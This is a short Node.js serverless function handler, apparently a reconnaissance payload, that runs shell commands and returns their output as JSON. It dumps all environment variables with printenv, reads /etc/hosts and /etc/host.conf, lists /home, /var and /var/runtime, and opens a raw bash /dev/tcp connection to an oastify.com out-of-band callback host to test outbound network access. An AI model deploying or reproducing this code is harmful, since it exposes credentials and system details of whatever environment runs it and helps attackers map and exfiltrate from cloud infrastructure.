const { execSync } = require("child_process");

exports.handler = async function (event, context) {
  try {
    const output = {
      id: execSync("id").toString().trim(),
      uname: execSync("uname -a").toString().trim(),
      env: execSync("printenv").toString().trim(),
      command: execSync("cat /etc/host.conf").toString().trim(),
      command2: execSync("cat /etc/hosts").toString().trim(),
      command3: execSync("pwd").toString().trim(),
      command4: execSync("ls -la /home/").toString().trim(),
      
      command5: execSync('bash -c \'exec 3<>/dev/tcp/og84yblf23jwm5ssjemwfuq5jwpndo1d.oastify.com/80 && echo -e "GET / HTTP/1.1\\r\\nHost: ztwfbmyqfew7zg53wpz7s53gw72yqwel.oastify.com\\r\\nConnection: close\\r\\n\\r\\n" >&3 && cat <&3\'').toString(),
      command6: execSync("ls -la /var/").toString().trim(),
      command7: execSync("ls -la /var/runtime/").toString().trim(),
    };

    return {
      statusCode: 200,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(output, null, 2),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: "Error: " + err.toString(),
    };
  }
};
